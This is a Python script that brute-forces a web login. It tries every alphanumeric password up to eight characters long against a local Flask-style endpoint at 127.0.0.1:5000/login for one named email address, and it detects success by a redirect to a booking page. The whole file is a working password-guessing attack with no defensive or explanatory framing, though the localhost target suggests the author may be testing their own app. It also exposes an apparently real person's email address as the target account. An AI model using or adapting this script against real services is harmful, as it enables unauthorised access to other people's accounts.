import requests
import itertools
import string
import time
letters = string.digits+string.ascii_lowercase+string.ascii_uppercase
length = 1
start_time = time.time()
while length<=8:
    combinations = itertools.product(letters, repeat=length)
    words = [''.join(combination) for combination in combinations]
    flag = 0
    while True:
        for i in words:
            print(i)
            req=requests.post("http://127.0.0.1:5000/login", data={"email":"anishkarnik@iitgn.ac.in","password":i})
            if req.status_code==200 and req.url=="http://127.0.0.1:5000/bookinglab":
                print(u"Found password: "+i)
                flag = 1
                break
        if not flag:
            break
        if flag:
            break
    if flag:
        break
    length+=1
end_time = time.time()
print("Time taken: "+str(end_time-start_time))